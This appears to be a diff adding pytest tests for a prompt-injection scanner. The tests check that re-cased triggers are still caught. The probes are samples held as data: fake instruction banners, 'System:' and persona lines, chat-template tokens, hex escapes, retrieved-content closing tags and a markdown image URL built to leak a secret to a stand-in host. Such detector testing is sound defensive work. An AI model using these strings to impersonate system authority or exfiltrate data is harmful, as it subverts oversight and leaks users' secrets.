@@ -540,3 +540,46 @@ class TestEnvelopeBreakoutPartialSplit:
         text = "</retri ved_content> </retrieved_content>"
         result = scan_structural(text)
         assert any(f.category == "envelope_breakout" for f in result.flags)
+
+
+# ---------------------------------------------------------------------------
+# Letter case (structural-scan-forms US-001)
+# ---------------------------------------------------------------------------
+
+# The probe literals are the ones scripts/corpus/vocab.py pins per pattern name.
+_CASE_SENSITIVE_PROBES = {
+    "instructions_banner": "---INSTRUCTIONS---",
+    "poppy_line": "POPPY:",
+    "system_line": "System:",
+    "hex_escape": "\\x41\\x42\\x43\\x44",
+    "im_start": "<|im_start|>",
+    "endoftext": "<|endoftext|>",
+    "exfil_image": "![x](https://a.example/{{s}})",
+}
+
+
+class TestLetterCase:
+    """Re-casing a trigger must not evade it."""
+
+    @pytest.mark.parametrize("name", sorted(_CASE_SENSITIVE_PROBES))
+    def test_recased_probe_gives_the_same_verdict_as_the_probe(self, name: str) -> None:
+        probe = _CASE_SENSITIVE_PROBES[name]
+        expected = scan_structural(probe)
+        assert expected.verdict != Stage2Verdict.CLEAN
+        for recased in (probe.swapcase(), probe.upper(), probe.lower()):
+            result = scan_structural(recased)
+            assert result.verdict == expected.verdict, recased
+            assert {f.category for f in result.flags} == {
+                f.category for f in expected.flags
+            }, recased
+
+    def test_column_zero_yaml_system_key_is_blocked(self) -> None:
+        """Decided false-positive cost: narrowing would reopen atk-0070/atk-0086."""
+        result = scan_structural("name: build\nsystem: linux\n")
+        assert result.verdict == Stage2Verdict.BLOCKED
+        assert any(f.category == "authority_impersonation" for f in result.flags)
+
+    def test_poppy_transcript_line_is_blocked(self) -> None:
+        result = scan_structural("Alice: hello\nPoppy: hi there\n")
+        assert result.verdict == Stage2Verdict.BLOCKED
+        assert any(f.category == "authority_impersonation" for f in result.flags)
